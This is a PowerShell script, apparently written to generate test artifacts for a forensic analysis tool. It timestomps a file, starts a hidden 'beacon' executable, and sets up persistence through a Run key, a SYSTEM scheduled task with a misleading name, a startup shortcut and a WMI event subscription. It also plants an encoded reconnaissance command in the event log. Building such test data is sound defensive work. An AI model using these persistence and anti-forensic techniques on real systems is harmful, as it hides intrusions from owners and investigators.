# ============================================================
#  SkiaHelios Trigger2: Operation "Sun Shadow" (Full Auto)
# ============================================================

$BinDir = "C:\Users\user\.gemini\antigravity\scratch\SkiaHelios\TestCase" # 配置場所に合わせて変えてくださいっス！
$Stomper = Join-Path $BinDir "timestomp.exe"
$Beacon = Join-Path $BinDir "beacon.exe"
$TargetFile = "$env:USERPROFILE\Documents\Secret_Project.pdf"

Write-Host "[*] Launching Operation Sun Shadow..." -ForegroundColor Cyan
Start-Sleep -Seconds 2

# --- Act 1: Chronos Target (Timestomp) ---
Write-Host "`n[1/4] Act 1: Executing Low-Layer Timestomp..." -ForegroundColor Yellow
"This is a classified forensic artifact." | Out-File -FilePath $TargetFile -Force
# 先輩の作った .exe で $SI を 2024年に飛ばすっス！！
& $Stomper $TargetFile "2024-01-01 12:00:00"
Write-Host " [+] $SI Backdated. Waiting for MFT settle..."
Start-Sleep -Seconds 10 # NTFS $LogFile へのコミット待ちっス

# --- Act 2: Plutos Target (C2 Beacon) ---
Write-Host "`n[2/4] Act 2: Starting Covert Beaconing..." -ForegroundColor Yellow
# バックグラウンドでビーコンを開始
Start-Process -FilePath $Beacon -WindowStyle Hidden
Write-Host " [+] Beaconing (beacon.exe) is running in shadow."
Start-Sleep -Seconds 60 # SRUM が通信統計を ESE DB に書き込むのを待つっス！！

# --- Trigger2: Act 3 Persistence (Registry, Task, Startup) ---
Write-Host "`n[3/4] Act 3: Establishing Triple Persistence..." -ForegroundColor Yellow

# 1. Registry Run Key (HKCU)
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $RegPath -Name "SunShadow_Update" -Value $Beacon -PropertyType String -Force | Out-Null
Write-Host " [+] Registry Key: Created in HKCU Run."

# 2. Scheduled Task (MFTにXMLファイルを刻むっス！)
$TaskName = "Windows_Security_Audit"
$Action = New-ScheduledTaskAction -Execute $Beacon
$Trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -Description "Daily Security Sync" -User "SYSTEM" -Force | Out-Null
Write-Host " [+] Scheduled Task: File created in System32\Tasks."

# 3. Startup Folder (物理的なファイル配置)
$StartupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$ShortcutPath = Join-Path $StartupDir "win_optimizer.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $Beacon
$Shortcut.Save()
Write-Host " [+] Startup Shortcut: Placed in $StartupDir"

# (Option) WMI - 今回はステルス枠として残すっス
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SunShadow_F"; EventNamespace = "root\cimv2"; QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 30"
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SunShadow_C"; CommandLineTemplate = $Beacon
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter; Consumer = $Consumer
} | Out-Null
Write-Host " [+] Persistence anchors set. Waiting for Registry flush..."
Start-Sleep -Seconds 15

# --- Act 4: Sphinx Target (Obfuscated Command) ---
Write-Host "`n[4/4] Act 4: Injecting Riddles into Event Log..." -ForegroundColor Yellow
$MalCode = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("whoami /all; netstat -ano; dir C:\Users\user\Documents"))
$Msg = "AppID: {1AC14E77-02E7-4E5D-B744-2EB1AE5198B7} context: $MalCode"
Write-EventLog -LogName "Windows PowerShell" -Source "PowerShell" -EventID 4104 -EntryType Information -Message $Msg
Write-Host " [+] Obfuscated command injected."

Write-Host "`n[*] Operation Sun Shadow Completed. 'The hunter becomes the hunted.'" -ForegroundColor Cyan